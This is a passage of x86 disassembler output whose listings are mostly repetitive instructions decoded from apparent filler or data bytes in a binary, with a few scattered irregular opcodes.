  447a9d:	add    bh,bh
  447a9f:	add    BYTE PTR [eax],al
  447aa1:	add    bh,bh
  447aa3:	add    BYTE PTR [eax],al
  447aa5:	add    bh,bh
  447aa7:	add    BYTE PTR [eax],al
  447aa9:	add    bh,bh
  447aab:	add    BYTE PTR [eax],al
  447aad:	add    bh,bh
  447aaf:	add    BYTE PTR [eax],al
  447ab1:	add    bh,bh
  447ab3:	add    BYTE PTR [eax],al
  447ab5:	add    bh,bh
  447ab7:	add    BYTE PTR [eax],al
  447ab9:	add    bh,bh
  447abb:	add    BYTE PTR [eax],al
  447abd:	add    bh,bh
  447abf:	add    BYTE PTR [eax],al
  447ac1:	add    bh,bh
  447ac3:	add    BYTE PTR [eax],al
  447ac5:	add    bh,bh
  447ac7:	add    BYTE PTR [eax],al
  447ac9:	add    bh,bh
  447acb:	add    BYTE PTR [eax],al
  447acd:	add    bh,bh
  447acf:	add    BYTE PTR [eax],al
  447ad1:	add    bh,bh
  447ad3:	add    BYTE PTR [eax],al
  447ad5:	add    bh,bh
  447ad7:	add    BYTE PTR [eax],al
  447ad9:	add    bh,bh
  447adb:	add    BYTE PTR [eax],al
  447add:	add    bh,bh
  447adf:	add    BYTE PTR [eax],al
  447ae1:	add    bh,bh
  447ae3:	add    BYTE PTR [eax],al
  447ae5:	add    bh,bh
  447ae7:	add    BYTE PTR [eax],al
  447ae9:	add    bh,bh
  447aeb:	add    BYTE PTR [eax],al
  447aed:	add    bh,bh
  447aef:	add    BYTE PTR [eax],al
  447af1:	add    bh,bh
  447af3:	add    BYTE PTR [eax],al
  447af5:	add    bh,bh
  447af7:	add    BYTE PTR [eax],al
  447af9:	add    bh,bh
  447afb:	add    BYTE PTR [eax],al
  447afd:	add    bh,bh
  447aff:	add    BYTE PTR [eax],al
  447b01:	add    bh,bh
  447b03:	add    BYTE PTR [eax],al
  447b05:	add    bh,bh
  447b07:	add    BYTE PTR [eax],al
  447b09:	add    bh,bh
  447b0b:	add    BYTE PTR [eax],al
  447b0d:	add    bh,bh
  447b0f:	add    BYTE PTR [eax],al
  447b11:	add    bh,bh
  447b13:	add    BYTE PTR [eax],al
  447b15:	add    bh,bh
  447b17:	add    BYTE PTR [eax],al
  447b19:	add    bh,bh
  447b1b:	add    BYTE PTR [eax],al
  447b1d:	add    bh,bh
  447b1f:	add    BYTE PTR [eax],al
  447b21:	add    bh,bh
  447b23:	add    BYTE PTR [eax],al
  447b25:	add    bh,bh
  447b27:	add    BYTE PTR [eax],al
  447b29:	add    bh,bh
  447b2b:	add    BYTE PTR [eax],al
  447b2d:	add    bh,bh
  447b2f:	add    BYTE PTR [eax],al
  447b31:	add    bh,bh
  447b33:	add    BYTE PTR [eax],al
  447b35:	add    bh,bh
  447b37:	add    BYTE PTR [eax],al
  447b39:	add    bh,bh
  447b3b:	xor    al,0x2d
  447b3d:	xor    ah,al
  447b3f:	add    BYTE PTR [eax],al
  447b41:	add    BYTE PTR [eax],al
  447b43:	mov    dh,0x91
  447b45:	mov    ds:0xb6b6c80e,eax
  447b4a:	push   cs
  447b4b:	add    BYTE PTR [eax],al
  447b4d:	add    BYTE PTR [eax],al
  447b4f:	push   eax
  447b50:	inc    esi
  447b51:	inc    esi
  447b52:	xor    edx,DWORD PTR [ebx]
  447b54:	adc    BYTE PTR [edi],cl
  447b56:	stc    
  447b57:	add    BYTE PTR [eax],al
  447b59:	add    bh,bh
  447b5b:	add    BYTE PTR [eax],al
  447b5d:	add    bh,bh
  447b5f:	add    BYTE PTR [eax],al
  447b61:	add    bh,bh
  447b63:	add    BYTE PTR [eax],al
  447b65:	add    bh,bh
  447b67:	add    BYTE PTR [eax],al
  447b69:	add    bh,bh
  447b6b:	add    BYTE PTR [eax],al
  447b6d:	add    bh,bh
  447b6f:	add    BYTE PTR [eax],al
  447b71:	add    bh,bh
  447b73:	add    BYTE PTR [eax],al
  447b75:	add    bh,bh
  447b77:	add    BYTE PTR [eax],al
  447b79:	add    bh,bh
  447b7b:	add    BYTE PTR [eax],al
  447b7d:	add    bh,bh
  447b7f:	add    BYTE PTR [eax],al
  447b81:	add    bh,bh
  447b83:	add    BYTE PTR [eax],al
  447b85:	add    bh,bh
  447b87:	add    BYTE PTR [eax],al
  447b89:	add    bh,bh
  447b8b:	add    BYTE PTR [eax],al
  447b8d:	add    bh,bh
  447b8f:	add    BYTE PTR [eax],al
  447b91:	add    bh,bh
  447b93:	add    BYTE PTR [eax],al
  447b95:	add    bh,bh
  447b97:	add    BYTE PTR [eax],al
  447b99:	add    bh,bh
  447b9b:	add    BYTE PTR [eax],al
  447b9d:	add    bh,bh
  447b9f:	add    BYTE PTR [eax],al
  447ba1:	add    bh,bh
  447ba3:	add    BYTE PTR [eax],al
  447ba5:	add    bh,bh
  447ba7:	add    BYTE PTR [eax],al
  447ba9:	add    bh,bh
  447bab:	add    BYTE PTR [eax],al
  447bad:	add    bh,bh
  447baf:	add    BYTE PTR [eax],al
  447bb1:	add    bh,bh
  447bb3:	add    BYTE PTR [eax],al
  447bb5:	add    bh,bh
  447bb7:	add    BYTE PTR [eax],al
  447bb9:	add    bh,bh
  447bbb:	add    BYTE PTR [eax],al
  447bbd:	add    bh,bh
  447bbf:	add    BYTE PTR [eax],al
  447bc1:	add    bh,bh
  447bc3:	add    BYTE PTR [eax],al
  447bc5:	add    bh,bh
  447bc7:	add    BYTE PTR [eax],al
  447bc9:	add    bh,bh
  447bcb:	add    BYTE PTR [eax],al
  447bcd:	add    bh,bh
  447bcf:	add    BYTE PTR [eax],al
  447bd1:	add    bh,bh
  447bd3:	add    BYTE PTR [eax],al
  447bd5:	add    bh,bh
  447bd7:	add    BYTE PTR [eax],al
  447bd9:	add    bh,bh
  447bdb:	add    BYTE PTR [eax],al
  447bdd:	add    bh,bh
  447bdf:	add    BYTE PTR [eax],al
  447be1:	add    bh,bh
  447be3:	add    BYTE PTR [eax],al
  447be5:	add    bh,bh
  447be7:	add    BYTE PTR [eax],al
  447be9:	add    bh,bh
  447beb:	add    BYTE PTR [eax],al
  447bed:	add    bh,bh
  447bef:	add    BYTE PTR [eax],al
  447bf1:	add    bh,bh
  447bf3:	add    BYTE PTR [eax],al
  447bf5:	add    bh,bh
  447bf7:	add    BYTE PTR [eax],al
  447bf9:	add    bh,bh
  447bfb:	add    BYTE PTR [eax],al
  447bfd:	add    bh,bh
  447bff:	add    BYTE PTR [eax],al
  447c01:	add    bh,bh
  447c03:	add    BYTE PTR [eax],al
  447c05:	add    bh,bh
  447c07:	add    BYTE PTR [eax],al
  447c09:	add    bh,bh
  447c0b:	add    BYTE PTR [eax],al
  447c0d:	add    bh,bh
  447c0f:	add    BYTE PTR [eax],al
  447c11:	add    bh,bh
  447c13:	add    BYTE PTR [eax],al
  447c15:	add    bh,bh
  447c17:	add    BYTE PTR [eax],al
  447c19:	add    bh,bh
  447c1b:	add    BYTE PTR [eax],al
  447c1d:	add    bh,bh
  447c1f:	add    BYTE PTR [eax],al
  447c21:	add    bh,bh
  447c23:	add    BYTE PTR [eax],al
  447c25:	add    bh,bh
  447c27:	add    BYTE PTR [eax],al
  447c29:	add    bh,bh
  447c2b:	add    BYTE PTR [eax],al
  447c2d:	add    bh,bh
  447c2f:	add    BYTE PTR [eax],al
  447c31:	add    bh,bh
  447c33:	add    BYTE PTR [eax],al
  447c35:	add    bh,bh
  447c37:	add    BYTE PTR [eax],al
  447c39:	add    bh,bh
  447c3b:	add    BYTE PTR [eax],al
  447c3d:	add    bh,bh
  447c3f:	add    BYTE PTR [eax],al
  447c41:	add    bh,bh
  447c43:	add    BYTE PTR [eax],al
  447c45:	add    bh,bh
  447c47:	add    BYTE PTR [eax],al
  447c49:	add    bh,bh
  447c4b:	add    BYTE PTR [eax],al
  447c4d:	add    bh,bh
  447c4f:	add    BYTE PTR [eax],al
  447c51:	add    bh,bh
  447c53:	add    BYTE PTR [eax],al
  447c55:	add    bh,bh
  447c57:	add    BYTE PTR [eax],al
  447c59:	add    bh,bh
  447c5b:	add    BYTE PTR [eax],al
  447c5d:	add    bh,bh
  447c5f:	add    BYTE PTR [eax],al
  447c61:	add    bh,bh
  447c63:	add    BYTE PTR [eax],al
  447c65:	add    bh,bh
  447c67:	add    BYTE PTR [eax],al
  447c69:	add    bh,bh
  447c6b:	add    BYTE PTR [eax],al
  447c6d:	add    bh,bh
  447c6f:	add    BYTE PTR [eax],al
  447c71:	add    bh,bh
  447c73:	add    BYTE PTR [eax],al
  447c75:	add    bh,bh
  447c77:	add    BYTE PTR [eax],al
  447c79:	add    bh,bh
  447c7b:	add    BYTE PTR [eax],al
  447c7d:	add    bh,bh
  447c7f:	add    BYTE PTR [eax],al
  447c81:	add    bh,bh
  447c83:	add    BYTE PTR [eax],al
  447c85:	add    bh,bh
  447c87:	add    BYTE PTR [eax],al
  447c89:	add    bh,bh
  447c8b:	add    BYTE PTR [eax],al
  447c8d:	add    bh,bh
  447c8f:	add    BYTE PTR [eax],al
  447c91:	add    bh,bh
  447c93:	add    BYTE PTR [eax],al
  447c95:	add    bh,bh
  447c97:	add    BYTE PTR [eax],al
  447c99:	add    bh,bh
  447c9b:	add    BYTE PTR [eax],al
  447c9d:	add    bh,bh
  447c9f:	add    BYTE PTR [eax],al
  447ca1:	add    bh,bh
  447ca3:	add    BYTE PTR [eax],al
  447ca5:	add    bh,bh
  447ca7:	add    BYTE PTR [eax],al
  447ca9:	add    bh,bh
  447cab:	add    BYTE PTR [eax],al
  447cad:	add    bh,bh
  447caf:	add    BYTE PTR [eax],al
  447cb1:	add    bh,bh
  447cb3:	add    BYTE PTR [eax],al
  447cb5:	add    bh,bh
  447cb7:	add    BYTE PTR [eax],al
  447cb9:	add    bh,bh
  447cbb:	add    BYTE PTR [eax],al
  447cbd:	add    bh,bh
  447cbf:	add    BYTE PTR [eax],al
  447cc1:	add    bh,bh
  447cc3:	add    BYTE PTR [eax],al
  447cc5:	add    bh,bh
  447cc7:	add    BYTE PTR [eax],al
  447cc9:	add    bh,bh
  447ccb:	add    BYTE PTR [eax],al
  447ccd:	add    bh,bh
  447ccf:	add    BYTE PTR [eax],al
  447cd1:	add    bh,bh
  447cd3:	add    BYTE PTR [eax],al
  447cd5:	add    bh,bh
  447cd7:	add    BYTE PTR [eax],al
  447cd9:	add    bh,bh
  447cdb:	add    BYTE PTR [eax],al
  447cdd:	add    bh,bh
  447cdf:	add    BYTE PTR [eax],al
  447ce1:	add    bh,bh
  447ce3:	add    BYTE PTR [eax],al
  447ce5:	add    bh,bh
  447ce7:	add    BYTE PTR [eax],al
  447ce9:	add    bh,bh
  447ceb:	add    BYTE PTR [eax],al
  447ced:	add    bh,bh
  447cef:	add    BYTE PTR [eax],al
  447cf1:	add    bh,bh
  447cf3:	add    BYTE PTR [eax],al
  447cf5:	add    bh,bh
  447cf7:	add    BYTE PTR [eax],al
  447cf9:	add    bh,bh
  447cfb:	add    BYTE PTR [eax],al
  447cfd:	add    bh,bh
  447cff:	add    BYTE PTR [eax],al
  447d01:	add    bh,bh
  447d03:	add    BYTE PTR [eax],al
  447d05:	add    bh,bh
  447d07:	add    BYTE PTR [eax],al
  447d09:	add    bh,bh
  447d0b:	add    BYTE PTR [eax],al
  447d0d:	add    bh,bh
  447d0f:	add    BYTE PTR [eax],al
  447d11:	add    bh,bh
  447d13:	add    BYTE PTR [eax],al
  447d15:	add    bh,bh
  447d17:	add    BYTE PTR [eax],al
  447d19:	add    bh,bh
  447d1b:	add    BYTE PTR [eax],al
  447d1d:	add    bh,bh
  447d1f:	add    BYTE PTR [eax],al
  447d21:	add    bh,bh
  447d23:	add    BYTE PTR [eax],al
  447d25:	add    bh,bh
  447d27:	add    BYTE PTR [eax],al
  447d29:	add    bh,bh
  447d2b:	add    BYTE PTR [eax],al
  447d2d:	add    bh,bh
  447d2f:	add    BYTE PTR [eax],al
  447d31:	add    bh,bh
  447d33:	add    BYTE PTR [eax],al
  447d35:	add    bh,bh
  447d37:	and    eax,0xe3201f
  447d3c:	add    BYTE PTR [eax],al
  447d3e:	add    BYTE PTR [eax],al
  447d40:	add    BYTE PTR [eax],al
  447d42:	add    BYTE PTR [esi-0x37f15c5d],dh
  447d48:	mov    dh,0xb6
  447d4a:	push   cs
	...
  447d53:	inc    ecx
  447d54:	xor    dh,BYTE PTR [edx]
  447d56:	and    edx,DWORD PTR [eax+edx*1]
  447d59:	or     eax,0xef
  447d5e:	inc    DWORD PTR [eax]
  447d60:	add    BYTE PTR [eax],al
  447d62:	inc    DWORD PTR [eax]
  447d64:	add    BYTE PTR [eax],al
  447d66:	inc    DWORD PTR [eax]
  447d68:	add    BYTE PTR [eax],al
  447d6a:	inc    DWORD PTR [eax]
  447d6c:	add    BYTE PTR [eax],al
  447d6e:	inc    DWORD PTR [eax]
  447d70:	add    BYTE PTR [eax],al
  447d72:	inc    DWORD PTR [eax]
  447d74:	add    BYTE PTR [eax],al
  447d76:	inc    DWORD PTR [eax]
  447d78:	add    BYTE PTR [eax],al
  447d7a:	inc    DWORD PTR [eax]
  447d7c:	add    BYTE PTR [eax],al
  447d7e:	inc    DWORD PTR [eax]
  447d80:	add    BYTE PTR [eax],al
  447d82:	inc    DWORD PTR [eax]
  447d84:	add    BYTE PTR [eax],al
  447d86:	inc    DWORD PTR [eax]
  447d88:	add    BYTE PTR [eax],al
  447d8a:	inc    DWORD PTR [eax]
  447d8c:	add    BYTE PTR [eax],al
  447d8e:	inc    DWORD PTR [eax]
  447d90:	add    BYTE PTR [eax],al
  447d92:	inc    DWORD PTR [eax]
  447d94:	add    BYTE PTR [eax],al
  447d96:	inc    DWORD PTR [eax]
  447d98:	add    BYTE PTR [eax],al
  447d9a:	inc    DWORD PTR [eax]
  447d9c:	add    BYTE PTR [eax],al
  447d9e:	inc    DWORD PTR [eax]
  447da0:	add    BYTE PTR [eax],al
  447da2:	inc    DWORD PTR [eax]
  447da4:	add    BYTE PTR [eax],al
  447da6:	inc    DWORD PTR [eax]
  447da8:	add    BYTE PTR [eax],al
  447daa:	inc    DWORD PTR [eax]
  447dac:	add    BYTE PTR [eax],al
  447dae:	inc    DWORD PTR [eax]
  447db0:	add    BYTE PTR [eax],al
  447db2:	inc    DWORD PTR [eax]
  447db4:	add    BYTE PTR [eax],al
  447db6:	inc    DWORD PTR [eax]
  447db8:	add    BYTE PTR [eax],al
  447dba:	inc    DWORD PTR [eax]
  447dbc:	add    BYTE PTR [eax],al
  447dbe:	inc    DWORD PTR [eax]
  447dc0:	add    BYTE PTR [eax],al
  447dc2:	inc    DWORD PTR [eax]
  447dc4:	add    BYTE PTR [eax],al
  447dc6:	inc    DWORD PTR [eax]
  447dc8:	add    BYTE PTR [eax],al
  447dca:	inc    DWORD PTR [eax]
  447dcc:	add    BYTE PTR [eax],al
  447dce:	inc    DWORD PTR [eax]
  447dd0:	add    BYTE PTR [eax],al
  447dd2:	inc    DWORD PTR [eax]
  447dd4:	add    BYTE PTR [eax],al
  447dd6:	inc    DWORD PTR [eax]
  447dd8:	add    BYTE PTR [eax],al
  447dda:	inc    DWORD PTR [eax]
  447ddc:	add    BYTE PTR [eax],al
  447dde:	inc    DWORD PTR [eax]
  447de0:	add    BYTE PTR [eax],al
  447de2:	inc    DWORD PTR [eax]
  447de4:	add    BYTE PTR [eax],al
  447de6:	inc    DWORD PTR [eax]
  447de8:	add    BYTE PTR [eax],al
  447dea:	inc    DWORD PTR [eax]
  447dec:	add    BYTE PTR [eax],al
  447dee:	inc    DWORD PTR [eax]
  447df0:	add    BYTE PTR [eax],al
  447df2:	inc    DWORD PTR [eax]
  447df4:	add    BYTE PTR [eax],al
  447df6:	inc    DWORD PTR [eax]
  447df8:	add    BYTE PTR [eax],al
  447dfa:	inc    DWORD PTR [eax]
  447dfc:	add    BYTE PTR [eax],al
  447dfe:	inc    DWORD PTR [eax]
  447e00:	add    BYTE PTR [eax],al
  447e02:	inc    DWORD PTR [eax]
  447e04:	add    BYTE PTR [eax],al
  447e06:	inc    DWORD PTR [eax]
  447e08:	add    BYTE PTR [eax],al
  447e0a:	inc    DWORD PTR [eax]
  447e0c:	add    BYTE PTR [eax],al
  447e0e:	inc    DWORD PTR [eax]
  447e10:	add    BYTE PTR [eax],al
  447e12:	inc    DWORD PTR [eax]
  447e14:	add    BYTE PTR [eax],al
  447e16:	inc    DWORD PTR [eax]
  447e18:	add    BYTE PTR [eax],al
  447e1a:	inc    DWORD PTR [eax]
  447e1c:	add    BYTE PTR [eax],al
  447e1e:	inc    DWORD PTR [eax]
  447e20:	add    BYTE PTR [eax],al
  447e22:	inc    DWORD PTR [eax]
  447e24:	add    BYTE PTR [eax],al
  447e26:	inc    DWORD PTR [eax]
  447e28:	add    BYTE PTR [eax],al
  447e2a:	inc    DWORD PTR [eax]
  447e2c:	add    BYTE PTR [eax],al
  447e2e:	inc    DWORD PTR [eax]
  447e30:	add    BYTE PTR [eax],al
  447e32:	inc    DWORD PTR [eax]
  447e34:	add    BYTE PTR [eax],al
  447e36:	inc    DWORD PTR [eax]
  447e38:	add    BYTE PTR [eax],al
  447e3a:	inc    DWORD PTR [eax]
  447e3c:	add    BYTE PTR [eax],al
  447e3e:	inc    DWORD PTR [eax]
  447e40:	add    BYTE PTR [eax],al
  447e42:	inc    DWORD PTR [eax]
  447e44:	add    BYTE PTR [eax],al
  447e46:	inc    DWORD PTR [eax]
  447e48:	add    BYTE PTR [eax],al
  447e4a:	inc    DWORD PTR [eax]
  447e4c:	add    BYTE PTR [eax],al
  447e4e:	inc    DWORD PTR [eax]
  447e50:	add    BYTE PTR [eax],al
  447e52:	inc    DWORD PTR [eax]
  447e54:	add    BYTE PTR [eax],al
  447e56:	inc    DWORD PTR [eax]
  447e58:	add    BYTE PTR [eax],al
  447e5a:	inc    DWORD PTR [eax]
  447e5c:	add    BYTE PTR [eax],al
  447e5e:	inc    DWORD PTR [eax]
  447e60:	add    BYTE PTR [eax],al
  447e62:	inc    DWORD PTR [eax]
  447e64:	add    BYTE PTR [eax],al
  447e66:	inc    DWORD PTR [eax]
  447e68:	add    BYTE PTR [eax],al
  447e6a:	inc    DWORD PTR [eax]
  447e6c:	add    BYTE PTR [eax],al
  447e6e:	inc    DWORD PTR [eax]
  447e70:	add    BYTE PTR [eax],al
  447e72:	inc    DWORD PTR [eax]
  447e74:	add    BYTE PTR [eax],al
  447e76:	inc    DWORD PTR [eax]
  447e78:	add    BYTE PTR [eax],al
  447e7a:	inc    DWORD PTR [eax]
  447e7c:	add    BYTE PTR [eax],al
  447e7e:	inc    DWORD PTR [eax]
  447e80:	add    BYTE PTR [eax],al
  447e82:	inc    DWORD PTR [eax]
  447e84:	add    BYTE PTR [eax],al
  447e86:	inc    DWORD PTR [eax]
  447e88:	add    BYTE PTR [eax],al
  447e8a:	inc    DWORD PTR [eax]
  447e8c:	add    BYTE PTR [eax],al
  447e8e:	inc    DWORD PTR [eax]
  447e90:	add    BYTE PTR [eax],al
  447e92:	inc    DWORD PTR [eax]
  447e94:	add    BYTE PTR [eax],al
  447e96:	inc    DWORD PTR [eax]
  447e98:	add    BYTE PTR [eax],al
  447e9a:	inc    DWORD PTR [eax]
  447e9c:	add    BYTE PTR [eax],al
  447e9e:	inc    DWORD PTR [eax]
  447ea0:	add    BYTE PTR [eax],al
  447ea2:	inc    DWORD PTR [eax]
  447ea4:	add    BYTE PTR [eax],al
  447ea6:	inc    DWORD PTR [eax]
  447ea8:	add    BYTE PTR [eax],al
  447eaa:	inc    DWORD PTR [eax]
  447eac:	add    BYTE PTR [eax],al
  447eae:	inc    DWORD PTR [eax]
  447eb0:	add    BYTE PTR [eax],al
  447eb2:	inc    DWORD PTR [eax]
  447eb4:	add    BYTE PTR [eax],al
  447eb6:	inc    DWORD PTR [eax]
  447eb8:	add    BYTE PTR [eax],al
  447eba:	inc    DWORD PTR [eax]
  447ebc:	add    BYTE PTR [eax],al
  447ebe:	inc    DWORD PTR [eax]
  447ec0:	add    BYTE PTR [eax],al
  447ec2:	inc    DWORD PTR [eax]
  447ec4:	add    BYTE PTR [eax],al
  447ec6:	inc    DWORD PTR [eax]
  447ec8:	add    BYTE PTR [eax],al
  447eca:	inc    DWORD PTR [eax]
  447ecc:	add    BYTE PTR [eax],al
  447ece:	inc    DWORD PTR [eax]
  447ed0:	add    BYTE PTR [eax],al
  447ed2:	inc    DWORD PTR [eax]
  447ed4:	add    BYTE PTR [eax],al
  447ed6:	inc    DWORD PTR [eax]
  447ed8:	add    BYTE PTR [eax],al
  447eda:	inc    DWORD PTR [eax]
  447edc:	add    BYTE PTR [eax],al
  447ede:	inc    DWORD PTR [eax]
  447ee0:	add    BYTE PTR [eax],al
  447ee2:	inc    DWORD PTR [eax]
  447ee4:	add    BYTE PTR [eax],al
  447ee6:	inc    DWORD PTR [eax]
  447ee8:	add    BYTE PTR [eax],al
  447eea:	inc    DWORD PTR [eax]
  447eec:	add    BYTE PTR [eax],al
  447eee:	inc    DWORD PTR [eax]
  447ef0:	add    BYTE PTR [eax],al
  447ef2:	inc    DWORD PTR [eax]
  447ef4:	add    BYTE PTR [eax],al
  447ef6:	inc    DWORD PTR [eax]
  447ef8:	add    BYTE PTR [eax],al
  447efa:	inc    DWORD PTR [eax]
  447efc:	add    BYTE PTR [eax],al
  447efe:	inc    DWORD PTR [eax]
  447f00:	add    BYTE PTR [eax],al
  447f02:	inc    DWORD PTR [eax]
  447f04:	add    BYTE PTR [eax],al
  447f06:	inc    DWORD PTR [eax]
  447f08:	add    BYTE PTR [eax],al
  447f0a:	inc    DWORD PTR [eax]
  447f0c:	add    BYTE PTR [eax],al
  447f0e:	inc    DWORD PTR [eax]
  447f10:	add    BYTE PTR [eax],al
  447f12:	inc    DWORD PTR [eax]
  447f14:	add    BYTE PTR [eax],al
  447f16:	inc    DWORD PTR [eax]
  447f18:	add    BYTE PTR [eax],al
  447f1a:	inc    DWORD PTR [eax]
  447f1c:	add    BYTE PTR [eax],al
  447f1e:	inc    DWORD PTR [eax]
  447f20:	add    BYTE PTR [eax],al
  447f22:	inc    DWORD PTR [eax]
  447f24:	add    BYTE PTR [eax],al
  447f26:	inc    DWORD PTR [eax]
  447f28:	add    BYTE PTR [eax],al
  447f2a:	inc    DWORD PTR [eax]
  447f2c:	add    BYTE PTR [eax],al
  447f2e:	inc    DWORD PTR [eax]
  447f30:	add    BYTE PTR [eax],al
  447f32:	push   DWORD PTR [ebx]
  447f34:	cs cs int3 
  447f37:	xor    esi,DWORD PTR [ebx]
  447f39:	xor    eax,DWORD PTR ds:0x0
  447f3f:	add    BYTE PTR [eax],al
  447f41:	add    BYTE PTR [eax],al
  447f43:	fcmovu st,st(2)
  447f45:	fimul  DWORD PTR [esi]
  447f47:	sar    BYTE PTR [ecx+0xbb9],1
	...
  447f55:	add    BYTE PTR [eax],al
  447f57:	xor    esi,DWORD PTR [ebx]
  447f59:	xor    eax,DWORD PTR ds:0xbb1f232b
  447f5f:	pop    es
  447f60:	push   es
  447f61:	push   es
  447f62:	inc    BYTE PTR [eax]
  447f64:	add    BYTE PTR [eax],al
  447f66:	inc    DWORD PTR [eax]
  447f68:	add    BYTE PTR [eax],al
  447f6a:	inc    DWORD PTR [eax]
  447f6c:	add    BYTE PTR [eax],al
  447f6e:	inc    DWORD PTR [eax]
  447f70:	add    BYTE PTR [eax],al
  447f72:	inc    DWORD PTR [eax]
  447f74:	add    BYTE PTR [eax],al
  447f76:	inc    DWORD PTR [eax]
  447f78:	add    BYTE PTR [eax],al
  447f7a:	inc    DWORD PTR [eax]
  447f7c:	add    BYTE PTR [eax],al
  447f7e:	inc    DWORD PTR [eax]
  447f80:	add    BYTE PTR [eax],al
  447f82:	inc    DWORD PTR [eax]
  447f84:	add    BYTE PTR [eax],al
  447f86:	inc    DWORD PTR [eax]
  447f88:	add    BYTE PTR [eax],al
  447f8a:	inc    DWORD PTR [eax]
  447f8c:	add    BYTE PTR [eax],al
  447f8e:	inc    DWORD PTR [eax]
  447f90:	add    BYTE PTR [eax],al
  447f92:	inc    DWORD PTR [eax]
  447f94:	add    BYTE PTR [eax],al
  447f96:	inc    DWORD PTR [eax]
  447f98:	add    BYTE PTR [eax],al
  447f9a:	inc    DWORD PTR [eax]
  447f9c:	add    BYTE PTR [eax],al
  447f9e:	inc    DWORD PTR [eax]
  447fa0:	add    BYTE PTR [eax],al
  447fa2:	inc    DWORD PTR [eax]
  447fa4:	add    BYTE PTR [eax],al
  447fa6:	inc    DWORD PTR [eax]
  447fa8:	add    BYTE PTR [eax],al
  447faa:	inc    DWORD PTR [eax]
  447fac:	add    BYTE PTR [eax],al
  447fae:	inc    DWORD PTR [eax]
  447fb0:	add    BYTE PTR [eax],al
  447fb2:	inc    DWORD PTR [eax]
  447fb4:	add    BYTE PTR [eax],al
  447fb6:	inc    DWORD PTR [eax]
  447fb8:	add    BYTE PTR [eax],al
  447fba:	inc    DWORD PTR [eax]
  447fbc:	add    BYTE PTR [eax],al
  447fbe:	inc    DWORD PTR [eax]
  447fc0:	add    BYTE PTR [eax],al
  447fc2:	inc    DWORD PTR [eax]
  447fc4:	add    BYTE PTR [eax],al
  447fc6:	inc    DWORD PTR [eax]
  447fc8:	add    BYTE PTR [eax],al
  447fca:	inc    DWORD PTR [eax]
  447fcc:	add    BYTE PTR [eax],al
  447fce:	inc    DWORD PTR [eax]
  447fd0:	add    BYTE PTR [eax],al
  447fd2:	inc    DWORD PTR [eax]
  447fd4:	add    BYTE PTR [eax],al
  447fd6:	inc    DWORD PTR [eax]
  447fd8:	add    BYTE PTR [eax],al
  447fda:	inc    DWORD PTR [eax]
  447fdc:	add    BYTE PTR [eax],al
  447fde:	inc    DWORD PTR [eax]
  447fe0:	add    BYTE PTR [eax],al
  447fe2:	inc    DWORD PTR [eax]
  447fe4:	add    BYTE PTR [eax],al
  447fe6:	inc    DWORD PTR [eax]
  447fe8:	add    BYTE PTR [eax],al
  447fea:	inc    DWORD PTR [eax]
  447fec:	add    BYTE PTR [eax],al
  447fee:	inc    DWORD PTR [eax]
  447ff0:	add    BYTE PTR [eax],al
  447ff2:	inc    DWORD PTR [eax]
  447ff4:	add    BYTE PTR [eax],al
  447ff6:	inc    DWORD PTR [eax]
  447ff8:	add    BYTE PTR [eax],al
  447ffa:	inc    DWORD PTR [eax]
  447ffc:	add    BYTE PTR [eax],al
  447ffe:	inc    DWORD PTR [eax]
  448000:	add    BYTE PTR [eax],al
  448002:	inc    DWORD PTR [eax]
  448004:	add    BYTE PTR [eax],al
  448006:	inc    DWORD PTR [eax]
  448008:	add    BYTE PTR [eax],al
  44800a:	inc    DWORD PTR [eax]
  44800c:	add    BYTE PTR [eax],al
  44800e:	inc    DWORD PTR [eax]
  448010:	add    BYTE PTR [eax],al
  448012:	inc    DWORD PTR [eax]
  448014:	add    BYTE PTR [eax],al
  448016:	inc    DWORD PTR [eax]
  448018:	add    BYTE PTR [eax],al
  44801a:	inc    DWORD PTR [eax]
  44801c:	add    BYTE PTR [eax],al
  44801e:	inc    DWORD PTR [eax]
  448020:	add    BYTE PTR [eax],al
  448022:	inc    DWORD PTR [eax]
  448024:	add    BYTE PTR [eax],al
  448026:	inc    DWORD PTR [eax]
  448028:	add    BYTE PTR [eax],al
  44802a:	inc    DWORD PTR [eax]
  44802c:	add    BYTE PTR [eax],al
  44802e:	inc    DWORD PTR [eax]
  448030:	add    BYTE PTR [eax],al
  448032:	inc    DWORD PTR [eax]
  448034:	add    BYTE PTR [eax],al
  448036:	inc    DWORD PTR [eax]
  448038:	add    BYTE PTR [eax],al
  44803a:	inc    DWORD PTR [eax]
  44803c:	add    BYTE PTR [eax],al
  44803e:	inc    DWORD PTR [eax]
  448040:	add    BYTE PTR [eax],al
  448042:	inc    DWORD PTR [eax]
  448044:	add    BYTE PTR [eax],al
  448046:	inc    DWORD PTR [eax]
  448048:	add    BYTE PTR [eax],al
  44804a:	inc    DWORD PTR [eax]
  44804c:	add    BYTE PTR [eax],al
  44804e:	inc    DWORD PTR [eax]
  448050:	add    BYTE PTR [eax],al
  448052:	inc    DWORD PTR [eax]
  448054:	add    BYTE PTR [eax],al
  448056:	inc    DWORD PTR [eax]
  448058:	add    BYTE PTR [eax],al
  44805a:	inc    DWORD PTR [eax]
  44805c:	add    BYTE PTR [eax],al
  44805e:	inc    DWORD PTR [eax]
  448060:	add    BYTE PTR [eax],al
  448062:	inc    DWORD PTR [eax]
  448064:	add    BYTE PTR [eax],al
  448066:	inc    DWORD PTR [eax]
  448068:	add    BYTE PTR [eax],al
  44806a:	inc    DWORD PTR [eax]
  44806c:	add    BYTE PTR [eax],al
  44806e:	inc    DWORD PTR [eax]
  448070:	add    BYTE PTR [eax],al
  448072:	inc    DWORD PTR [eax]
  448074:	add    BYTE PTR [eax],al
  448076:	inc    DWORD PTR [eax]
  448078:	add    BYTE PTR [eax],al
  44807a:	inc    DWORD PTR [eax]
  44807c:	add    BYTE PTR [eax],al
  44807e:	inc    DWORD PTR [eax]
  448080:	add    BYTE PTR [eax],al
  448082:	inc    DWORD PTR [eax]
  448084:	add    BYTE PTR [eax],al
  448086:	inc    DWORD PTR [eax]
  448088:	add    BYTE PTR [eax],al
  44808a:	inc    DWORD PTR [eax]
  44808c:	add    BYTE PTR [eax],al
  44808e:	inc    DWORD PTR [eax]
  448090:	add    BYTE PTR [eax],al
  448092:	inc    DWORD PTR [eax]
  448094:	add    BYTE PTR [eax],al
  448096:	inc    DWORD PTR [eax]
  448098:	add    BYTE PTR [eax],al
  44809a:	inc    DWORD PTR [eax]
  44809c:	add    BYTE PTR [eax],al
  44809e:	inc    DWORD PTR [eax]
  4480a0:	add    BYTE PTR [eax],al
  4480a2:	inc    DWORD PTR [eax]
  4480a4:	add    BYTE PTR [eax],al
  4480a6:	inc    DWORD PTR [eax]
